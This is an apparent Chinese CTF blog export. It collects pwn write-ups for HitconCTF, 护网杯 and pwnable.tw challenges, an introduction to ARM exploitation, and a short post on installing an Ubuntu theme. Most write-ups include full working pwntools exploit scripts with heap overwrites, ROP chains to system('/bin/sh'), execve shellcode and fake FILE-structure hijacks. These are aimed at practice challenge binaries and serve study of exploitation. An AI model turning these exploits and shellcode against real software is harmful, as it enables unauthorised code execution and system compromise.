&#123;&#125;".format(hex(libc_base)))add(2,0x60,'a'*0x60)delete(2)edit(2,p64(__malloc_hook_add-0x13))add(3,0x60,"b"*0x60)add(4,0x60,'a'*0x13 + p64(one_gadget))log.info("get shell")p.sendlineafter('&gt;&gt; ', '1')p.sendlineafter('Enter the index:\n', '5')p.sendlineafter('Enter the size:\n', '0')p.interactive()]]></content>
      <categories>
        <category>CTF&#39;s writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HitconCTF 复现]]></title>
    <url>%2F2018%2F10%2F23%2F2018-10-23-HitconCTF-%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[toooo这道题是我在苦逼的写完了社会实践报告后刷D4rk3r大佬的博客看到的，感觉很有意思，就先看了这道题 这题是一道arm的pwn，可是它被分类到了misc，可能大佬觉得这是脑洞题吧 查看了下程序的架构 12☁ tooooo file tooooo tooooo: ELF 64-bit LSB shared object, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, for GNU/Linux 3.7.0, BuildID[sha1]=9e7e0f87a22c5b75cb0926d54d3d3f33fbac1fad, stripped 这是一道arm64的题，先配置下虚拟机的环境 12345☁ tooooo apt-cache search &quot;libc6&quot; | grep arm64libc6-arm64-cross - GNU C Library: Shared libraries (for cross-compiling)libc6-dev-arm64-cross - GNU C Library: Development Libraries and Header Files (for cross-compiling)libc6-dbg-arm64-cross - GNU C Library: detached debugging symbols (for cross-compiling) ☁ tooooo sudo apt-get install libc6-arm64-cross 因为题目给了libc文件和ld所以用题目给的就行了，运行前需要将ld-2.27.so重命名为ld-linux-aarch64.so.1 以及将libc-2.27.so重命名为libc.so.6 12将重命名的文件放入lib文件夹，lib文件夹放在和程序同个目录下qemu-aarch64 -L ./ tooooo 简单运行下发现它打印出了一个地址，然后要输入一个字符串，最后在打印一个字符串退出了 1234☁ tooooo qemu-aarch64 -L ./ tooooo 0x40009b1560fasdfToo many :) 用ida查看了下反编译的伪代码 1234567891011121314151617181920212223242526__int64 vuln()&#123; unsigned int v1; // [xsp+18h] [xbp+18h] __int64 v2; // [xsp+20h] [xbp+20h] void (__fastcall *v3)(_QWORD, __int64, __int64, __int64); // [xsp+28h] [xbp+28h] __int64 v4; // [xsp+30h] [xbp+30h] __int64 v5; // [xsp+38h] [xbp+38h] v3 = &amp;unk_F40; init_fuc(); v1 = open("/dev/urandom", 0LL); if ( (v1 &amp; 0x80000000) != 0 ) _exit(0xFFFFFFFFLL); v2 = 0LL; if ( read(v1, &amp;v2, 4LL) &lt;= 0 ) return v5 ^ _stack_chk_guard; printf("0x%llx\n", stdout); v4 = mmap(v2 &amp; 0x7FFFF000, 12288LL, 3LL, 34LL, 0xFFFFFFFFLL, 0LL); if ( v4 == -1 ) _exit(0xFFFFFFFFLL); if ( read(v1, v4, 12288LL) &lt;= 0 ) _exit(4294967294LL); get_string(&amp;unk_12018, 0x30u); v3(v1, v4 + 0x2000, write_1, write_2); return v5 ^ _stack_chk_guard;&#125; 这里可以发现，它将stdout的地址打印出来了，所以可以计算出libc的地址。然后它往&amp;unk_12018写入0x30个字节的内容,通过这个可以将在bss段上的 write_1和write_2两个函数指针给覆盖掉，而这两个函数在后面都会执行，所以这里可以获得两次调用函数的机会，但是要怎么getshell呢。这里我看到大佬们用了一个很骚的函数 getusershell()，先执行getusershell()函数，将”/bin/sh”存储在x0寄存器中，然后再执行system函数 arm64的调用约定:参数1~参数8 分别保存到 X0~X7 寄存器中 ，剩下的参数从右往左依次入栈，被调用者实现栈平衡，返回值存放在 X0 中。 exp: 12345678910111213141516171819202122232425#!/usr/bin/env pythonfrom pwn import *local = 0debug = 0if local: if debug: p = process(["qemu-aarch64", "-g", "1234", "-L", "./", "tooooo"]) else: p = process(["qemu-aarch64", "-L", "./", "tooooo"])else: p = remote("13.230.48.252","4869") elf = ELF("tooooo")libc = ELF("./lib/libc.so.6")context.binary = "tooooo"context.log_level = "debug"libc_base = int(p.recvline().strip("\n"),16) - libc.symbols['_IO_2_1_stdout_']print hex(libc_base)libc.address = libc_basepayload = 'a'*0x20 + p64(libc.symbols["getusershell"]) + p64(libc.symbols["system"])p.sendline(payload)p.interactive() reference: D4rk3r大佬的writeup]]></content>
      <categories>
        <category>CTF&#39;s writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
        <tag>Hitcon</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[护网杯wp及复现]]></title>
    <url>%2F2018%2F10%2F16%2F2018-10-14-%E6%8A%A4%E7%BD%91%E6%9D%AFwp%E5%8F%8A%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[昨天刚打完护网杯线上赛，被自己菜哭，菜的真实，所以现在来赛后复现了 start签到题，就是覆盖栈上的变量为特定的值，有点新奇的就是有一个变量要覆盖成小数0.1 0.1 在内存中存储形式为 0x3fb999999999999a exp： 12345678910111213141516171819202122#!/usr/bin/env pythonfrom pwn import *local = 0if local: p = process('./gettingstart') elf = ELF('./gettingstart') libc = elf.libcelse: host = '49.4.94.186' port = '32680' p = remote(host,port) elf = ELF('./gettingstart')context.arch = elf.archcontext.log_level='debug'p.recvuntil("you.\n")payload = "1"*0x18+p64(0x7FFFFFFFFFFFFFFF)+p64(0x3fb999999999999a)p.send(payload)p.interactive() shopping很气人 ，我离做出就差一个__free_hook 防护机制： 1234567☁ shopping checksec shopping [*] &apos;/home/zs0zrc/game/huwangbei/PWN/shopping /shopping&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 通过ida分析下程序逻辑 大致有两个功能 get_monye 获得money buy 购买物品 12345678910111213141516171819202122232425unsigned __int64 getmoney()&#123; unsigned __int64 v0; // rax char s; // [rsp+10h] [rbp-20h] unsigned __int64 v3; // [rsp+28h] [rbp-8h] v3 = __readfsqword(0x28u); while ( 1 ) &#123; while ( 1 ) &#123; puts("EMMmmm, you will be a rich man!"); fgets(&amp;s, 24, stdin); v0 = strtoul(&amp;s, 0LL, 0); if ( v0 != 2 ) break; puts_something(); &#125; if ( v0 == 3 ) break; if ( v0 == 1 ) get_money(); &#125; return __readfsqword(0x28u) ^ v3;&#125; 然后buy中又存在三个功能 get_goods 获得商品 delete_goods 删除商品 edit_goods 编辑商品 1234567891011121314151617181920212223242526272829303132333435unsigned __int64 buy()&#123; unsigned __int64 v0; // rax char s; // [rsp+10h] [rbp-20h] unsigned __int64 v3; // [rsp+28h] [rbp-8h] v3 = __readfsqword(0x28u); do &#123; while ( 1 ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; puts("Now, buy buy buy!"); fgets(&amp;s, 24, stdin); v0 = strtoul(&amp;s, 0LL, 0); if ( v0 != 2 ) break; free_goods(); &#125; if ( v0 &gt; 2 ) break; if ( v0 == 1 ) get_goods(); &#125; if ( v0 != 3 ) break; edit_goods(); &#125; &#125; while ( v0 != 4 ); return __readfsqword(0x28u) ^ v3;&#125; 这道题目的漏洞在edit_goods函数中，它用strtoul函数来获取商品的下标 它的函数原型是 123unsigned long strtoul (const char* str, char** endptr, int base);endstr 为第一个不能转换的字符的指针，base 为字符串 str 所采用的进制。strtoul() 会扫描参数 str 字符串，跳过前面的空白字符 漏洞点 1234idx = strtoul(&amp;s, 0LL, 0);printf("OK, what would you like to modify %s to?\n", *buy_array[idx], idx);*(*buy_array[v1] + read(0, *buy_array[v1], 8uLL)) = 0;//没有对输入的值的下限进行检查，可以读取一个负数，造成数组下标溢出 泄露信息只要先生成一个unsorted bin大小的chunk，然后delete它，再malloc(0)，就可以泄露出libc的信息 这里要借助get_money中生成的两个数组来实现任意地址写，因为edit功能是通过二重引用指针，修改的是buy_array[idx]的内容指向的地址上的内容，而money_array数组中存储着array数组的地址，所以我们修改edit_goods修改money_array的内容，在array中布置我们想要修改的地址，最后再修改array对应的位置， 就可以实现任意地址写 1234567891011121314if ( counts_g &lt;= 0x13 )&#123; puts("I will give you $9999, but what's the currency type you want, RMB or Dollar?"); v1 = malloc(0x10uLL); v2 = v1; v1[1] = 0x270FLL; fgets(&amp;array[8 * counts_g], 8, stdin); *v2 = &amp;array[8 * counts_g]; v3 = counts_g++; v4 = 8 * v3; v0 = &amp;money_array; *(&amp;money_array + v4) = v2;&#125; 这里我看writeup看到很多种做法， 改__free_hook为system,再free掉一个包含”sh”字符串的chunk 改libc里面的 malloc@got为one_gadget，然后再生成一个chunk就可以getshell，但是这个libc中的got表我在网上怎么都查不到，真的是学到了 还有一种没有用到chunk的，直接就数组下标溢出做的wirteup 各位师傅真的是tql，我的exp用的是第一种 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101#!/usr/bin/env pythonfrom pwn import *local = 1if local: p = process('./shopping') elf = ELF('./shopping') libc = elf.libcelse: host = '117.78.26.200' port = '32599' p = remote(host,port) elf = ELF('./shopping') libc = ELF('./libc6_2.23-0ubuntu10_amd64.so')context.arch = elf.archcontext.log_level='debug'def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content)def debug(addr,PIE=False): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) log.info("text_base:&#123;&#125;".format(hex(text_base))) log.info("buy_array:&#123;&#125;".format(hex(text_base + 0x2021E0))) log.info("get_array:&#123;&#125;".format(hex(text_base + 0x202140))) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr)))def get_money(): ru("EMMmmm, you will be a rich man!\n") for i in range(0x14): sl('1') rc() sl('1234') ru("EMMmmm, you will be a rich man!\n") sl('3')def buy_goods(size,name): ru('Now, buy buy buy!\n') sl('1') ru('How long is your goods name?\n') sl(str(size)) ru(' name?\n') sl(name)def edit_goods(idx,name): rc() sl('3') rc() sl(idx) ru(" to?\n") sd(name)def delete_goods(idx): rc() sl('2') rc() sl(str(idx))get_money()buy_goods(0x88,'a'*8)#0buy_goods(0x88,'sh')#1buy_goods(0x88,'a'*8)#2delete_goods(0)buy_goods(0,'')pause()log.info("---------leak libc-----------")rc()sl('3')rc()sl('3')ru("modify ")leak = u64(p.recv(6).ljust(8,'\x00')) libc_base = leak - libc.symbols['__malloc_hook'] - 0x10- 216libc.address = libc_baseprint hex(leak)print hex(libc_base)sl('aaaaa')rc()edit_goods(' -1',p64(libc.got['__free_hook']))edit_goods(' -21',p64(libc.symbols['system']))delete_goods(1)p.interactive() huwang防护机制： 1234567☁ huwang checksec huwang [*] &apos;/home/zs0zrc/game/huwangbei/PWN/huwang/huwang&apos; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 这题看起来像是堆的题，但其实堆分配的部分都没用，主要的功能集中在选项666中 它先打开secret文件，往里面写入随机数，然后输入md5加密的次数，循环加密后将结果存入secret中，然后要我们猜在secret存储的md5值。程序在写入md5结果时会先清空文件的内容，并且如果它没对输入的数字的下限进行判断，所以可以输入一个”-1”，程序就会循环执行MD5直到超时杀死自己，导致sercet文件的内容为空。那么md5的值就是可以预测的，16个null的md5也就是 0x000000000000000的MD5 —-&gt;[4ae71336e44bf9bf79d2752e234818a5] 同时name填0x19个字符可以泄漏出canary ，md5猜成功后会进入success函数，这里存在一个栈溢出，是由snprintf函数造成的，snprintf函数返回的值是想要写入的值，知道了canary就可以用ROP了，先泄露出libc地址，然后构造rop链调用system函数 123456789101112131415161718192021222324252627282930int __fastcall sub_40101C(__int64 a1)&#123; char v1; // ST1B_1 int v3; // [rsp+1Ch] [rbp-214h] char v4; // [rsp+20h] [rbp-210h] char s; // [rsp+120h] [rbp-110h] unsigned __int64 v6; // [rsp+228h] [rbp-8h] v6 = __readfsqword(0x28u); printf("Congratulations, %s guessed my secret!\n", a1); puts("And I want to know someting about you, and introduce you to other people who guess the secret!"); puts("What`s your occupation?"); sub_400CC1(&amp;v4, 255LL); v3 = snprintf( &amp;s, 0xFFuLL, "I know a new friend, his name is %s,and he is a noble %s.He is come from north and he is very handsome........." "..................................................................................... ............", a1, &amp;v4); puts("Here is your introduce"); puts(&amp;s); puts("Do you want to edit you introduce by yourself[Y/N]"); v1 = getchar(); getchar(); if ( v1 == 'Y' ) read(0, &amp;s, v3 - 1); //stack overflow return printf("The final presentation is as follows:%s\n", &amp;s);&#125; exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#!/upr/bin/env pythonfrom pwn import *p = process('./huwang')elf = ELF('./huwang')libc = elf.libccontext.arch = elf.archcontext.terminal = ['tmux', 'splitw', '-h']context.log_level='debug'def prepare(): p.sendlineafter("command&gt;&gt; \n",'666') p.sendlineafter("name\n",'a'*0x8) p.sendlineafter("secret?\n","y") p.sendlineafter("secret:\n", '-1') p.recvuntil('timeout~') def expoit(): p = process('./huwang') p.sendlineafter("command&gt;&gt; \n",'666') p.sendafter("name\n",'a'*0x18+"#") p.sendlineafter("secret?\n","y") p.sendlineafter("secret:\n", '1') p.sendafter('secret\n', "J\xe7\x136\xe4K\xf9\xbfy\xd2u.#H\x18\xa5") p.recvuntil("#") canary = u64('\0' + p.recv(7)) print hex(canary) p.recvuntil("occupation?\n") p.send('a'*0xff) p.sendlineafter("[Y/N]\n","Y") pop_rdi = 0x401573 leave_ret = 0x400d45 ret = 0x40101C ropchain = 'a'*0x108 + p64(canary) + p64(0) + p64(pop_rdi) + p64(elf.got['puts'])+ p64(ret) p.sendline(ropchain) p.recvuntil("Congratulations, ") libc_base = u64(p.recv(6).ljust(8,'\x00')) - libc.symbols['puts'] libc.address = libc_base payload = 'a'*0x108 + p64(canary) + p64(0) + p64(pop_rdi) + p64(libc.search('/bin/sh').next()) + p64(libc.symbols['system']) p.recvuntil("occupation?\n") p.send('a'*0xff) p.sendlineafter("[Y/N]\n","Y") p.sendline(payload) p.interactive() prepare()expoit() 被23R3F大佬鞭策，回来把剩下的两道题复现下 six大佬们的writeup： 23R3F 防护机制： 1234567☁ six checksec six[*] &apos;/home/zs0zrc/pwn/huwangbei/six/six&apos; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 拖入ida简单逆向下,程序一开始先用mmap分配了两个区域 12345678910111213141516171819202122unsigned __int64 init_fuc()&#123; int fd; // ST04_4 __int64 buf; // [rsp+8h] [rbp-18h] __int64 v3; // [rsp+10h] [rbp-10h] unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); fd = open("/dev/urandom", 0); read(fd, &amp;buf, 6uLL); read(fd, &amp;v3, 6uLL); text = mmap((v3 &amp; 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 7, 34, -1, 0LL); //text段具有rwx权限，用来存放要执行的代码 stacks = mmap((buf &amp; 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 3, 34, -1, 0LL) + 0x500; //stacks用来模拟栈 //这里分配的空间，当两个地址冲突或者不符合条件时，就会随机分配，随机分配的两个区域是相邻的，相邻时stacks与text的距离为0xb00 return __readfsqword(0x28u) ^ v4;&#125; 然后输入6个字节的shellcode,将shellcode放入text中，且shellcode要满足三个奇数，三个偶数 1234567891011121314151617181920212223242526272829303132__int64 __fastcall sub_B05(__int64 a1)&#123; __int64 result; // rax unsigned int v2; // [rsp+10h] [rbp-10h] int v3; // [rsp+14h] [rbp-Ch] signed int i; // [rsp+18h] [rbp-8h] int j; // [rsp+1Ch] [rbp-4h] v2 = 0; v3 = 0; for ( i = 0; i &lt;= 5; ++i ) &#123; if ( *(i + a1) &amp; 1 ) ++v2; else ++v3; for ( j = i + 1; j &lt;= 5; ++j ) &#123; if ( *(i + a1) == *(j + a1) ) &#123; puts("Invalid shellcode!"); exit(0); &#125; &#125; &#125; result = v2; if ( v2 == v3 ) return result; puts("Invalid shellcode!"); exit(0); return result;&#125; 在执行我们输入的shellcode前，程序会先执行一段代码 1234567891011121314151617Disassembly:0: 48 89 fc mov rsp,rdi3: 48 31 ed xor rbp,rbp6: 48 31 c0 xor rax,rax9: 48 31 db xor rbx,rbxc: 48 31 c9 xor rcx,rcxf: 48 31 d2 xor rdx,rdx12: 48 31 ff xor rdi,rdi15: 48 31 f6 xor rsi,rsi18: 4d 31 c0 xor r8,r81b: 4d 31 c9 xor r9,r91e: 4d 31 d2 xor r10,r1021: 4d 31 db xor r11,r1124: 4d 31 e4 xor r12,r1227: 4d 31 ed xor r13,r132a: 4d 31 f6 xor r14,r142d: 4d 31 ff xor r15,r15 这是从src变量中提出出来的，这里做的就是将rsp指向mmap出来用作栈的空间，然后将各个寄存器清零。 因为这里将rax置0了，所以如果进行syscall的话就会调用read函数，往stack上写入内容。如果此时stacks和text是mmap随机分配的，那么这两个区域会是相邻的，stacks在低地址。从rsp开始覆写，可以覆盖代码段。 调用read函数的shellcode 12340: 54 push rsp1: 5e pop rsi2: 89 f2 mov edx,esi4: 0f 05 syscall exp： 1234567891011121314151617181920212223#!/usr/bin/env pythonfrom pwn import *elf = ELF('./six')libc = elf.libccontext.arch = elf.archcontext.log_level='debug'def exploit(): p = process('./six') shellcode1='''push rsp;pop rsi;mov edx,esi;syscall''' p.sendafter(':',asm(shellcode1)) paylaod ='\x90'*0xb36+asm(shellcraft.sh()) p.send(paylaod) p.interactive()while 1: try: exploit() except Exception: pass calender待填 大佬们的writeup 天枢 Whitzard 师傅的writeup 大佬的writeup]]></content>
      <categories>
        <category>CTF&#39;s writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu主题Flatabulous安装]]></title>
    <url>%2F2018%2F10%2F07%2F2018-10-7-Ubuntu%E4%B8%BB%E9%A2%98Flatabulous%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[最近看到一个超好看的Ubuntu主题 —-&gt; Flatabulous 大致长这样子，我的Ubuntu版本是 16.04 ，所以之前的ubuntu-tweak就没用了， 我改用gnome-tweak-tool 首先装一个 gnome-tweak-tool 1sudo apt-get install gnome-tweak-tool 然后安装Flatabulous这个主题 123456789第一种方法：sudo add-apt-repository ppa:noobslab/themessudo apt-get updatesudo apt-get install flatabulous-theme第二种方法：sudo chown $USER:$USER -R /usr/share/themes/sudo chmod 755 -R /usr/share/themes/cd /usr/share/themes/git clone https://github.com/anmoljagetia/Flatabulous 安装ultra-flat-icons 123sudo add-apt-repository ppa:noobslab/iconssudo apt-get updatesudo apt-get install ultra-flat-icons 然后用gnome-tweak-tool配置 ​ 最后就可以看到超酷的界面了，如果没有变化的话重启一下就可以看到了]]></content>
      <categories>
        <category>TOOL</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable.tw writeup]]></title>
    <url>%2F2018%2F10%2F07%2F2018-10-7-pwnable.tw-writeup%2F</url>
    <content type="text"><![CDATA[start 防护机制： 12345670 % checksec start [*] &apos;/home/zs0zrc/pwn/pwnable.tw/start/start&apos; Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) 用ida看了下程序，发现只有十几行汇编代码 12345678910111213141516171819202122232425262728293031.text:08048060 ; =============== S U B R O U T I N E =======================================.text:08048060.text:08048060.text:08048060 public _start.text:08048060 _start proc near.text:08048060 push esp.text:08048061 push offset _exit.text:08048066 xor eax, eax.text:08048068 xor ebx, ebx.text:0804806A xor ecx, ecx.text:0804806C xor edx, edx.text:0804806E push &apos;:FTC&apos;.text:08048073 push &apos; eht&apos;.text:08048078 push &apos; tra&apos;.text:0804807D push &apos;ts s&apos;.text:08048082 push 2774654Ch.text:08048087 mov ecx, esp ; addr.text:08048089 mov dl, 14h ; len.text:0804808B mov bl, 1 ; fd.text:0804808D mov al, 4.text:0804808F int 80h ; LINUX - sys_write.text:08048091 xor ebx, ebx.text:08048093 mov dl, 3Ch.text:08048095 mov al, 3.text:08048097 int 80h ; LINUX -.text:08048099 add esp, 14h.text:0804809C retn.text:0804809C _start endp ; sp-analysis failed.text:0804809C.text:0804809D.text:0804809D ; =============== S U B R O U T I N E ======================================= 这里实现了wirte 和read的系统调用，在调用read时存在栈溢出。看到防护机制后想到的做法就是 往栈上写shellcode，然后执行shellcode。具体要先泄露stack的地址，然后往栈上写shellcode再覆盖返回地址为shellcode的地址，最后跳转去执行shellcode exp： 123456789101112131415161718from pwn import*context.log_level = 'debug'#p = remote('chall.pwnable.tw',10000)p = process('./start')shellcode ="\x31\xc0\x50\x68\x2f\x2f\x73"\ "\x68\x68\x2f\x62\x69\x6e\x89"\ "\xe3\x89\xc1\x89\xc2\xb0\x0b"\ "\xcd\x80\x31\xc0\x40\xcd\x80"p.recv()payload = 'a'*0x14 + p32(0x08048087)#writep.send(payload)leak = u32(p.recv(4))stack = leak + 0x10print "leak_stack --&gt;[%s]"%hex(leak_stack)p.send('a'*0x14+p32(leak_stack+0x4)+shellcode)p.interactive() orw 这题之前做过类似的 ，就是HITCON-Training-master的lab2 这题也是要执行shellcode，不过它限制了可以执行的函数，要求用open read和write 3个函数来读取flag 我拿以前的脚本改了下就打通了 exp: 123456789101112131415161718192021222324252627282930#!/usr/bin/env python # -*-: coding: UTF-8 -*- from pwn import* context.log_level = 'debug'#p = process('./orw') p = remote('chall.pwnable.tw',10001)shellcode = '''mov eax,0x5 push 0x6761push 0x6c662f77push 0x726f2f65push 0x6d6f682fmov ebx,espxor ecx,ecxint 0x80 mov eax,0x3 mov ecx,ebx mov ebx,0x3 mov dl,0x30 int 0x80 mov eax,0x4 mov bl,0x1 int 0x80 ''' payload = asm(shellcode) p.recv() p.send(payload) p.interactive() 不过这个我看别人的wp又学到了一种姿势，就是用pwntools的 函数自动生成对应函数的shellcode 12345shellcode = ''shellcode += shellcraft.pushstr('/home/orw/flag')#往栈上压入字符串shellcode += shellcraft.open('esp', 0, 0)#设置参数shellcode += shellcraft.read('eax', 'esp', 100)shellcode += shellcraft.write(1, 'esp', 100) seethefile防护机制： 123456[*] &apos;/home/zs0zrc/pwn/pwnable.tw/seethefile/seethefile&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 程序一共五个功能 Open : 打开一个文件，但是不能打开flag文件 Read ： 读取文件的0x18字节的内容 Write to screen ： 将读取的内容打印出来 Close ： 关闭文件流 Exit ： 读取名字，同时关闭文件流并退出程序 程序的文件流指针存放在bss段 123456.bss:0804B280 public fp.bss:0804B280 ; FILE *fp.bss:0804B280 fp dd ? ; DATA XREF: openfile+6↑r.bss:0804B280 ; openfile+AD↑w ....bss:0804B280 _bss ends.bss:0804B280 name变量在fp变量的上面，同时程序读取name时没限制长度，所以可以覆盖fp指针，通过伪造_IO_FILE_plus结构体，覆盖fp指针指向伪造的结构体，最后通过fclose函数关闭fp来getshell,即劫持fp指针 不过要先知道libc的地址，libc的地址可以通过读取 /proc/self/maps文件来来得到 泄露libc地址 1234567891011121314151617181920212223242526def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content) rc()sl('1')rc()sl('/proc/self/maps')rc()sl('2')rc()sl('2')rc()sl('3')leak = ru("r-xp")libc_base = int("0x"+leak[-22:-14],16)print hex(libc_base)system = libc_base + libc.symbols['system'] 伪造fake_file 123456789name_add = 0x804B260fake_file = "/bin/sh\x00"fake_file = fake_file.ljust(0x20,'\x00') fake_file += p32(name_add)#覆盖fp为name_addfake_file = fake_file.ljust(0x48,'\x00')fake_file += p32(name_add + 0x10) # 指向一处值为0的地址fake_file = fake_file.ljust(0x94, "\x00")fake_file += p32(0x804b2f8-0x44)#fake vtable address = name_add + 0x98 - 0x44fake_file += p32(system) 但是这题getshell还不够，要拿到flag还要运行服务器上的一个程序….有点骚，他将cat flag 命令删掉了，不过程序源码也给出了，很容易看到逻辑，按照它的判断条件输入，它就会将flag打印出来 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#!/usr/bin/env pythonfrom pwn import *local = 0if local: p = process('./seethefile') elf = ELF('./seethefile') libc = elf.libcelse: host = 'chall.pwnable.tw' port = '10200' p = remote(host,port) elf = ELF('./seethefile') libc = ELF('./libc_32.so.6')context.arch = elf.archcontext.terminal = ['tmux', 'splitw', '-h']context.log_level='debug'def sd(content): p.send(content)def sl(content): p.sendline(content)def rc(): return p.recv()def ru(content): return p.recvuntil(content) rc()sl('1')rc()sl('/proc/self/maps')rc()sl('2')rc()sl('2')rc()sl('3')leak = ru("r-xp")libc_base = int("0x"+leak[-22:-14],16)print hex(libc_base)system = libc_base + libc.symbols['system']name_add = 0x804B260fake_file = "/bin/sh\x00"fake_file = fake_file.ljust(0x20,'\x00') fake_file += p32(name_add)fake_file = fake_file.ljust(0x48,'\x00')fake_file += p32(name_add + 0x10)fake_file = fake_file.ljust(0x94, "\x00")fake_file += p32(0x804b2f8-0x44)fake_file += p32(system)sl('5')rc()sl(fake_file)p.interactive()]]></content>
      <categories>
        <category>CTF&#39;s writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>pwnable.tw</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[初探arm下的pwn]]></title>
    <url>%2F2018%2F10%2F07%2F2018-10-7-%E5%88%9D%E6%8E%A2arm%E4%B8%8B%E7%9A%84pwn%2F</url>
    <content type="text"><![CDATA[最近做了下InCTF，第一道pwn题就是arm架构的，之前没有接触过，就学习一下 基础知识可以看下维基百科的arm架构 ，介绍的挺详细的 arm下的通用寄存器 函数调用约定： ARM：参数1~参数4 分别保存到 R0~R3 寄存器中 ，剩下的参数从右往左依次入栈，被调用者实现栈平衡，返回值存放在 R0 中。 ARM64：参数1~参数8 分别保存到 X0~X7 寄存器中 ，剩下的参数从右往左依次入栈，被调用者实现栈平衡，返回值存放在 X0 中。 arm下的pc相当于eip或者rip，保存着下一条要执行的指令的地址 环境准备这里我没装新的虚拟机，我直接在ubuntu16.04装的环境 安装gdb-multiarch，用来调试多架构的程序 1sudo apt-get install gdb-multiarch 安装qemu 1sudo apt-get install qemu-user 安装程序架构对应的共享库 简单运行下程序，看需要什么共享库 12$ ./wARMup [19:42:58]/lib/ld-linux-armhf.so.3: No such file or directory 然后再终端输入 123456789101112131415zs0zrc@ubuntu: ~/game/InCTF/PWN/WARMUP$ apt-cache search &quot;libc6&quot; | grep arm [10:34:21]libc6-arm64-cross - GNU C Library: Shared libraries (for cross-compiling)libc6-armhf-cross - GNU C Library: Shared libraries (for cross-compiling)libc6-dev-arm64-cross - GNU C Library: Development Libraries and Header Files (for cross-compiling)libc6-dev-armhf-cross - GNU C Library: Development Libraries and Header Files (for cross-compiling)libc6-armel-armhf-cross - Dummy package to get libc6:armel installedlibc6-armel-cross - GNU C Library: Shared libraries (for cross-compiling)libc6-armhf-armel-cross - Dummy package to get libc6:armhf installedlibc6-dbg-arm64-cross - GNU C Library: detached debugging symbols (for cross-compiling)libc6-dbg-armel-cross - GNU C Library: detached debugging symbols (for cross-compiling)libc6-dbg-armhf-cross - GNU C Library: detached debugging symbols (for cross-compiling)libc6-dev-armel-armhf-cross - Dummy package to get libc6-dev:armel installedlibc6-dev-armel-cross - GNU C Library: Development Libraries and Header Files (for cross-compiling)libc6-dev-armhf-armel-cross - Dummy package to get libc6-dev:armhf installed 安装对应的共享库 通过 sudo apt-get install libc6-armhf-cross 来安装 运行 程序运行需要用qemu来指定它共享库的位置 12参数 -L指定共享库的位置qemu-arm -L /usr/arm-linux-gnueabihf/ ./wARMup 调试的话用gdb-multiarch 先用qemu将程序映射到某个端口，参数为-g 然后用gdb-multiarch开启远程调试 123456先用qemu映射到端口1234qemu-arm -g 1234 -L /usr/arm-linux-gnueabihf/ ./wARMup然后用gdb-multiarch开启远程调试pwndbg&gt; set architecture armThe target architecture is assumed to be armpwndbg&gt; target remote localhost:1234 题目typo这是jarvisoj平台上的一道pwn题 防护机制: 123456[*] &apos;/home/zs0zrc/pwn/jarvisoj/typo/typo&apos; Arch: arm-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8000) 文件信息： 12☁ typo file typotypo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped 说明这个程序是静态链接，所以程序中一定会有system函数以及”/bin/sh”字符串，但是用ida反编译时会发现函数的符号都被去除了，但是可以在字符串表找到”/bin/sh”字符串，这里用rizzo插件恢复下符号。 做法： 1234567891011121314151617将arm的libc.so文件拖入ida然后在选择 file--&gt;Produce file--&gt;Rizzo signature file导出符号文件 然后用ida打开typo 选择 file--&gt;Load file--&gt;Rizzo signature file就可以看到一些函数符号了char *__fastcall system(int a1)&#123; char *result; // r0 if ( a1 ) result = sub_10BA8(a1); else result = (sub_10BA8("exit 0") == 0); return result;&#125; 简单运行下程序，程序要我们输入一个字符串，因为arm下的pwn一般是栈溢出居多，而且防护机制没开canary，所以用pwndbg测了下栈的大小 12pwndbg&gt; cyclic -l 0x62616164112 栈的长度为112，接下来就是找能控制r0和pc的gadget，这里我用的是ropper 12345678910111213(typo/ELF/ARM)&gt; search pop|ret |grep r0[INFO] Searching for gadgets: pop|ret |grep r0[INFO] File: typo0x00011364: pop &#123;lr&#125;; add sp, sp, #0x10; bx lr; 0x00011398: pop &#123;lr&#125;; add sp, sp, #0xc; bx 